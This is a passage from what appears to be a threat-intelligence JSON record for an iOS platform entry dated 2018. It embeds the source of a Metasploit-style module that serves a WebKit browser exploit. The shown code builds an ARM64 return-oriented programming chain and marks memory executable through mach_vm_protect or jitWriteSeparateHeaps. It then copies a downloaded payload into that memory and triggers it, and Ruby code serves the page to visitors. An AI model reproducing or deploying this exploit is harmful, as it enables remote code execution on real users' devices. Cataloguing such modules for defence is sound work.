memPoolStart        = Int64.Zero;\n    if (startOfFixedMem) {\n        memPoolStart = memory.readInt64(startOfFixedMem);\n    }\n\n    var jitWriteSeparateHeaps = Int64.Zero;\n    if (offsets[\"__ZN3JSC29jitWriteSeparateHeapsFunctionE\"]) {\n        jitWriteSeparateHeaps = memory.readInt64(offsets[\"__ZN3JSC29jitWriteSeparateHeapsFunctionE\"]);\n    }\n\n    var shsz = new Int64(\"0x100000\");\n    var paddr = memory.readInt64(Add(stage1.addrof(payload), 0x10));\n    var codeAddr = Sub(memPoolEnd, shsz);\n    codeAddr = Sub(codeAddr, codeAddr.lo() & 0x3fff);\n\n    memory.writeInt64(Add(vtab, 0x18), longjmp);\n    memory.writeInt64(Add(el_addr, 0x58), stackloader);        // x30 (gadget)\n\n    var arrsz = 0x100000,\n        off   =   0x1000;\n    var arr   = new Uint32Array(arrsz);\n    var stack = memory.readInt64(Add(stage1.addrof(arr), 0x10));\n\n    var pos = arrsz - off;\n\n    var add_call_llvm = function(func, x0, x1, x2, x3, x4, jump_to) {\n        x4 = x4 || Int64.Zero\n\n        // in stackloader:\n        arr[pos++] = 0xdead0010;                // unused\n        arr[pos++] = 0xdead0011;                // unused\n        arr[pos++] = 0xdead0012;                // unused\n        arr[pos++] = 0xdead0013;                // unused\n        arr[pos++] = dispatch.lo();             // x28 (gadget for regloader)\n        arr[pos++] = dispatch.hi();             // x28 (gadget for regloader)\n        arr[pos++] = 0xdead0014;                // x27 (unused)\n        arr[pos++] = 0xdead0015;                // x27 (unused)\n        arr[pos++] = x4.lo();                   // x26 == x4 (arg5)\n        arr[pos++] = x4.hi();                   // x26 == x4 (arg5)\n        arr[pos++] = x3.lo();                   // x25 == x3 (arg4)\n        arr[pos++] = x3.hi();                   // x25 == x3 (arg4)\n        arr[pos++] = x2.lo();                   // x24 == x2 (arg3)\n        arr[pos++] = x2.hi();                   // x24 == x2 (arg3)\n        arr[pos++] = x0.lo();                   // x23 == x0 (arg1)\n        arr[pos++] = x0.hi();                   // x23 == x0 (arg1)\n        arr[pos++] = x1.lo();                   // x22 == x1 (arg2)\n        arr[pos++] = x1.hi();                   // x22 == x1 (arg2)\n        arr[pos++] = func.lo();                 // x21 (func)\n        arr[pos++] = func.hi();                 // x21 (func)\n        arr[pos++] = 0xdbad0018;                // x20 (unused)\n        arr[pos++] = 0xdbad0019;                // x20 (unused)\n        arr[pos++] = 0xdead001a;                // x19 (unused)\n        arr[pos++] = 0xdead001b;                // x19 (unused)\n        var tmppos = pos;\n        arr[pos++] = Add(stack, tmppos*4 + 0x40).lo(); // x29\n        arr[pos++] = Add(stack, tmppos*4 + 0x40).hi(); // x29\n        arr[pos++] = regloader.lo();            // x30 (first gadget)\n        arr[pos++] = regloader.hi();            // x30 (first gadget)\n\n        // after dispatch:\n        arr[pos++] = 0xdead0020;                // unused\n        arr[pos++] = 0xdead0021;                // unused\n        arr[pos++] = 0xdead0022;                // unused\n        arr[pos++] = 0xdead0023;                // unused\n        arr[pos++] = 0xdead0024;                // x22 (unused)\n        arr[pos++] = 0xdead0025;                // x22 (unused)\n        arr[pos++] = 0xdead0026;                // x21 (unused)\n        arr[pos++] = 0xdead0027;                // x21 (unused)\n        arr[pos++] = 0xdead0028;                // x20 (unused)\n        arr[pos++] = 0xdead0029;                // x20 (unused)\n        arr[pos++] = 0xdead002a;                // x19 (unused)\n        arr[pos++] = 0xdead002b;                // x19 (unused)\n        tmppos = pos;\n        arr[pos++] = Add(stack, tmppos*4 + 0x70).lo(); // x29\n        arr[pos++] = Add(stack, tmppos*4 + 0x70).hi(); // x29\n        arr[pos++] = jump_to.lo();              // x30 (gadget)\n        arr[pos++] = jump_to.hi();              // x30 (gadget)\n    }\n\n    var add_call_via_x8 = function(func, x0, x1, x2, x3, x4, jump_to) {\n        //alert(`add_call_via_x8: ${func}(${x0}, ${x1}, ${x2}, ${x3}, ${x4}, ${jump_to})`);\n        //x4 = x4 || Int64.One\n        // in stackloader:\n        arr[pos++] = 0xdead0010;                // unused\n        arr[pos++] = 0xdead0011;                // unused\n        arr[pos++] = 0xdead0012;                // unused\n        arr[pos++] = 0xdead0013;                // unused\n        arr[pos++] = 0xdead1101;                // x28 (unused)\n        arr[pos++] = 0xdead1102;                // x28 (unused)\n        arr[pos++] = 0xdead0014;                // x27 == x6 (unused)\n        arr[pos++] = 0xdead0015;                // x27 == x6 (unused)\n        arr[pos++] = 0xdead0016;                // x26 (unused)\n        arr[pos++] = 0xdead0017;                // x26 (unused)\n        arr[pos++] = x3.lo();                   // x25 == x3 (arg4)\n        arr[pos++] = x3.hi();                   // x25 == x3 (arg4)\n        arr[pos++] = x0.lo();                   // x24 == x0 (arg1)\n        arr[pos++] = x0.hi();                   // x24 == x0 (arg1)\n        arr[pos++] = x2.lo();                   // x23 == x2 (arg3)\n        arr[pos++] = x2.hi();                   // x23 == x2 (arg3)\n        arr[pos++] = x3.lo();                   // x22 == x3 (arg4)\n        arr[pos++] = x3.hi();                   // x22 == x3 (arg4)\n        arr[pos++] = func.lo();                 // x21 (target for dispatch)\n        arr[pos++] = func.hi();                 // x21 (target for dispatch)\n        arr[pos++] = 0xdead0018;                // x20 (unused)\n        arr[pos++] = 0xdead0019;                // x20 (unused)\n        var tmppos = pos;\n        arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])\n        arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])\n        arr[pos++] = 0xdead001c;                // x29 (unused)\n        arr[pos++] = 0xdead001d;                // x29 (unused)\n        arr[pos++] = ldrx8.lo();                // x30 (next gadget)\n        arr[pos++] = ldrx8.hi();                // x30 (next gadget)\n\n        // in ldrx8\n        if (x4) {\n            arr[pos++] = stackloader.lo();\n            arr[pos++] = stackloader.hi();\n        } else {\n            arr[pos++] = dispatch.lo();             // x8 (target for regloader)\n            arr[pos++] = dispatch.hi();             // x8 (target for regloader)\n        }\n        arr[pos++] = 0xdead1401;                // (unused)\n        arr[pos++] = 0xdead1402;                // (unused)\n        arr[pos++] = 0xdead1301;                // x20 (unused)\n        arr[pos++] = 0xdead1302;                // x20 (unused)\n        arr[pos++] = x1.lo();                   // x19 == x1 (arg2)\n        arr[pos++] = x1.hi();                   // x19 == x1 (arg2)\n        arr[pos++] = 0xdead1201;                // x29 (unused)\n        arr[pos++] = 0xdead1202;                // x29 (unused)\n        arr[pos++] = regloader.lo();            // x30 (next gadget)\n        arr[pos++] = regloader.hi();            // x30 (next gadget)\n\n        // in regloader\n        // NOTE: REGLOADER DOES NOT ADJUST SP!\n        // sometimes i didn't get expected value in x4\n        // and i have no earthly idea why\n        // usleep likely did the trick, but I would still keep the code\n        // with movx4\n        //arr[pos++] = x4.lo()                    // x4 (should be -- but see lines above)\n        //arr[pos++] = x4.hi()                    // x4 (should be -- but see lines above)\n\n        if (x4) {\n            // in stackloader:\n            arr[pos++] = 0xdaad0010;                // unused\n            arr[pos++] = 0xdaad0011;                // unused\n            arr[pos++] = 0xdaad0012;                // unused\n            arr[pos++] = 0xdaad0013;                // unused\n            arr[pos++] = 0xdaad1101;                // x28 (unused)\n            arr[pos++] = 0xdaad1102;                // x28 (unused)\n            arr[pos++] = 0xdaad0014;                // x27 == x6 (unused)\n            arr[pos++] = 0xdaad0015;                // x27 == x6 (unused)\n            arr[pos++] = 0xdaad0016;                // x26 (unused)\n            arr[pos++] = 0xdaad0017;                // x26 (unused)\n            arr[pos++] = 0xdaad0018;                // x25 (unused)\n            arr[pos++] = 0xdaad0019;                // x25 (unused)\n            arr[pos++] = 0xdaad00f0;                // x24 (unused)\n            arr[pos++] = 0xdaad00f1;                // x24 (unused)\n            arr[pos++] = 0xdaad00f2;                // x23 (unused)\n            arr[pos++] = 0xdaad00f3;                // x23 (unused)\n            arr[pos++] = 0xdaad00f4;                // x22 (unused)\n            arr[pos++] = 0xdaad00f5;                // x22 (unused)\n            arr[pos++] = func.lo();                 // x21 (target for dispatch)\n            arr[pos++] = func.hi();                 // x21 (target for dispatch)\n            arr[pos++] = 0xdaad0018;                // x20 (unused)\n            arr[pos++] = 0xdaad0019;                // x20 (unused)\n            tmppos = pos;\n            arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])\n            arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])\n            arr[pos++] = 0xdaad001c;                // x29 (unused)\n            arr[pos++] = 0xdaad001d;                // x29 (unused)\n            arr[pos++] = ldrx8.lo();                // x30 (next gadget)\n            arr[pos++] = ldrx8.hi();                // x30 (next gadget)\n\n            // in ldrx8\n            arr[pos++] = dispatch.lo();             // x8 (target for movx4)\n            arr[pos++] = dispatch.hi();             // x8 (target for movx4)\n            arr[pos++] = 0xdaad1401;                // (unused)\n            arr[pos++] = 0xdaad1402;                // (unused)\n            arr[pos++] = x4.lo();                   // x20 == x4 (arg5)\n            arr[pos++] = x4.hi();                   // x20 == x4 (arg5)\n            arr[pos++] = 0xdaad1301;                // x19 (unused)\n            arr[pos++] = 0xdaad1302;                // x19 (unused)\n            arr[pos++] = 0xdaad1201;                // x29 (unused)\n            arr[pos++] = 0xdaad1202;                // x29 (unused)\n            arr[pos++] = movx4.lo();                // x30 (next gadget)\n            arr[pos++] = movx4.hi();                // x30 (next gadget)\n        }\n\n        // after dispatch:\n\n        // keep only one: these or 0xdeaded01\n        arr[pos++] = 0xdead0022;                // unused\n        arr[pos++] = 0xdead0023;                // unused\n\n        arr[pos++] = 0xdead0022;                // unused\n        arr[pos++] = 0xdead0023;                // unused\n        arr[pos++] = 0xdead0024;                // x22 (unused)\n        arr[pos++] = 0xdead0025;                // x22 (unused)\n        arr[pos++] = 0xdead0026;                // x21 (unused)\n        arr[pos++] = 0xdead0027;                // x21 (unused)\n        arr[pos++] = 0xdead0028;                // x20 (unused)\n        arr[pos++] = 0xdead0029;                // x20 (unused)\n        arr[pos++] = 0xdead002a;                // x19 (unused)\n        arr[pos++] = 0xdead002b;                // x19 (unused)\n        arr[pos++] = 0xdead002c;                // x29 (unused)\n        arr[pos++] = 0xdead002d;                // x29 (unused)\n        arr[pos++] = jump_to.lo();              // x30 (gadget)\n        arr[pos++] = jump_to.hi();              // x30 (gadget)\n    }\n\n    var add_call = function(func, x0, x1, x2, x3, x4, jump_to) {\n        x0 = x0 || Int64.Zero\n        x1 = x1 || Int64.Zero\n        x2 = x2 || Int64.Zero\n        x3 = x3 || Int64.Zero\n        jump_to = jump_to || stackloader\n\n        return (ldrx8 ? add_call_via_x8 : add_call_llvm)(\n            func, x0, x1, x2, x3, x4, jump_to\n        )\n    }\n\n    #{ios_11 ? '\n    if (jitWriteSeparateHeaps.lo() || jitWriteSeparateHeaps.hi()) {\n        add_call(jitWriteSeparateHeaps\n            , Sub(codeAddr, memPoolStart)     // off\n            , paddr                           // src\n            , shsz                            // size\n          );\n    } else {\n        fail(\"jitWrite\");\n    }\n    ' : '\n    add_call(mach_vm_protect,\n        mach_task_self_,    // task\n        codeAddr,           // addr\n        shsz,               // size\n        new Int64(0),       // set maximum\n        new Int64(7)        // prot (RWX)\n    );\n\n    add_call(memmove,\n        codeAddr,           // dst\n        paddr,              // src\n        shsz                // size\n    );\n    '}\n\n    add_call(codeAddr,\n        dlopen,\n        dlsym,\n        jitWriteSeparateHeaps,\n        memPoolStart,\n        memPoolEnd,\n    );\n\n    for(var i = 0; i < 0x20; ++i)\n    {\n        arr[pos++] = 0xde00c0de + (i<<16);\n    }\n\n    var sp = Add(stack, (arrsz - off) * 4);\n    memory.writeInt64(Add(el_addr, 0x60), Add(sp, 0x60));      // x29\n    memory.writeInt64(Add(el_addr, 0x68), sp);      // x2 (copied into sp)\n\n    // trigger\n    //print(\"u rdy?\")\n    wrapper.addEventListener(\"click\", function(){});\n\n}\n\n#{get_mem_rw}\n\nfunction go() {\n    try {\n        var req = new XMLHttpRequest;\n        req.open(\"GET\", \"exploit\");\n        req.responseType = \"arraybuffer\";\n        req.addEventListener(\"load\", function() {\n            try {\n                if (req.responseType != \"arraybuffer\") throw \"y u no blob\";\n                payload.set(new Uint8Array(req.response), 0x0);\n                pwn();\n            } catch (e) {\n                fail(\"Error: \" + e + (e != null ? \" \" + e.stack : \"\"))\n            }\n        });\n        req.addEventListener(\"error\", function(ev) {\n            fail(ev)\n        });\n        req.send()\n    } catch (e) {\n        fail(\"Error: \" + e + (e != null ? \" \" + e.stack : \"\"))\n    }\n};\n\ngo();\n\n</script>\n</body>\n</html>\n    ^\n    unless datastore['DEBUG_EXPLOIT']\n      html.gsub!(/\\/\\/.*$/, '') # strip comments\n      html.gsub!(/^\\s*print\\s*\\(.*?\\);\\s*$/, '') # strip print(*);\n    end\n    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-03-15",
    "x_mitre_platforms": [
        "apple_ios'"
    ]
}